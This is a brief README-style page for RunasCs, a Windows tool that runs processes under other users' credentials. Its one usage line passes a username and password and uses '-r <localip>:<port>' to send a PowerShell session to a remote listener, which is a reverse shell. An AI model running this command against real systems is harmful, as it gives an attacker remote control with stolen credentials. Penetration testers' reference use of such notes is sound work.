# runasCs

## Overview

RunasCs is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials. This tool is an improved and open version of windows builtin runas.exe that solves some limitations.


## Usage

    ./RunasCs.exe <username> <password> powershell.exe -r <localip>:<port>

## More Information

https://github.com/antonioCoco/RunasCs